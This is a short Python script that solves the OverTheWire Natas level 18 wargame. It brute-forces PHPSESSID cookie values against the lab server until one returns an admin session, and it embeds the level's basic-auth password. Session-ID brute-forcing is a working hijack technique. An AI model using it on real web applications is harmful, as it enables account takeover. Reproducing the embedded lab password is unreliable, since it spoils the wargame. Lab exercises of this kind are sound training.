import requests
from requests.auth import HTTPBasicAuth

fact="You are an admin. The credentials for the next level are:"

for i in range (641):
    cookie={'PHPSESSID':str(i)}
    url=requests.get('http://natas18.natas.labs.overthewire.org/index.php',auth=('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'),cookies=cookie)
    if fact in (url.text):
        print ("Gotcha ;-)......."+str(i))
        print (url.text)
        break
    print (i)
